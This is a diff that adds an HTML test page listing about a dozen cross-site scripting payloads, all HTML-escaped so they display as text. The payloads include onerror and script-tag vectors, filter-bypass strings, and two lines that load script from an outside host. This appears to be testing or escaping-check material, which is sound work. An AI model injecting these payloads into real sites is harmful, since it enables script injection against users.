@@ -1,0 +1,28 @@
+<html>
+<head>
+<style>
+body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center;}
+.payload-container { text-align: center; }
+.payload { padding: 10px; margin-bottom: 10px; background-color: #f0f0f0; }
+</style>
+</head>
+<body>
+<h1 id="h1_element">This is a h1 element</h1>
+<div class="payload-container">
+<div class="payload">test123</div>
+<div class="payload">&lt;img src=xss onerror=alert(1)&gt;</div>
+<div class="payload">blaoejds222</div>
+<div class="payload">;alert(&#x27;i&#x27;);//#</div>
+<div class="payload">&lt;script&gt;alert(1)&lt;!–</div>
+<div class="payload">&lt;script src=//brutelogic.com.br/1.js&gt;</div>
+<div class="payload">&lt;script src=//3334957647/1&gt;</div>
+<div class="payload">&lt;x oncopy=alert(1)&gt;copy this!</div>
+<div class="payload">&lt;img src=xss onerror=document.write(&quot;qwer$#@!&quot;)&gt;</div>
+<div class="payload">&lt;image src/onerror=prompt(8)&gt;</div>
+<div class="payload">&lt;img src/onerror=prompt(8)&gt;</div>
+<div class="payload">&lt;image src =q onerror=prompt(8)&gt;</div>
+<div class="payload">&lt;img src =q onerror=prompt(8)&gt;</div>
+<div class="payload">&lt;/scrip&lt;/script&gt;t&gt;&lt;img src =q onerror=p</div>
+</div>
+</body>
+</html>
